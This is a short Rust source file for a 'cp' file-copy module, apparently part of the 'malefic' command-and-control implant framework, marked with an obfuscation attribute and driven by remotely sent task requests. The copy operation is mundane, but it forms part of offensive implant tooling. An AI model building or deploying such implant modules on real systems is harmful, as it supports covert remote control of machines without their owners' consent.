use crate::prelude::*;

pub struct Cp {}

#[async_trait]
#[module_impl("cp")]
impl Module for Cp {}

#[async_trait]
#[obfuscate]
impl malefic_module::ModuleImpl for Cp {
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut malefic_module::Input,
        _: &mut malefic_module::Output,
    ) -> ModuleResult {
        let request = check_request!(receiver, Body::Request)?;
        let params = check_field!(request.args, 2)?;

        std::fs::copy(&params[0], &params[1])?;

        Ok(TaskResult::new(id))
    }
}
